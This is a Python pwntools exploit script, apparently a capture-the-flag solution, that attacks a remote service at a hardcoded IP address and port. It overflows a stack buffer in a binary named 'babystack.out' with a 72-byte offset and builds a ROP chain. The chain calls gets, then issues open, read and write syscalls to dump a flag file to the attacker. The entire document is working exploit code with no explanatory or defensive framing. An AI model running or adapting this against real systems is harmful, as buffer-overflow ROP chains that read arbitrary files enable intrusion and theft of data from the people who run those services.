from pwn import * 

def main():

    host = "34.136.150.230" 
    port = 49156
    p = remote(host, port)
    elf = ELF("./babystack.out")
    offset = 72 

    SYS_EXECVE = 0x3B 
    writable_memory = 0x00000000004bb400 + 0x40
    #read syscall
    rop = ROP(elf)
    pop_rdx_ret = rop.find_gadget(['pop rdx', 'ret']).address 
    pop_rsi_ret = rop.find_gadget(['pop rsi', 'ret']).address 
    pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret']).address 
    syscall = 0x0047d569
    xor_eax = 0x0000000000409778
    main = elf.symbols['main']
    gets = elf.symbols['gets']
    our_input = 0x4bb440
    pop_rax_ret = 0x0000000000410da4

    #call gets to read flagfile  
    payload = b'A' * offset 
    payload += p64(pop_rdi_ret)
    payload += p64(writable_memory)
    payload += p64(xor_eax)
    payload += p64(gets)
    
    
    #open file 
    payload += p64(pop_rax_ret)
    payload += p64(2)
    payload += p64(pop_rdi_ret)
    payload += p64(our_input)
    payload += p64(pop_rsi_ret)
    payload += p64(0)
    payload += p64(pop_rdx_ret)
    payload += p64(0)
    payload += p64(syscall)

    
    #read flag file into our address 
    payload += p64(pop_rdi_ret)
    payload += p64(3)
    payload += p64(xor_eax)
    payload += p64(pop_rsi_ret)
    payload += p64(our_input + 0x20)
    payload += p64(pop_rdx_ret)
    payload += p64(0x40)
    payload += p64(syscall)
    
    #write syscall 
    payload += p64(pop_rax_ret)
    payload += p64(1)
    payload += p64(pop_rdi_ret)
    payload += p64(1)
    payload += p64(pop_rsi_ret)
    payload += p64(our_input + 0x20)
    payload += p64(pop_rdx_ret)
    payload += p64(0x40)
    payload += p64(syscall)

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":

    main()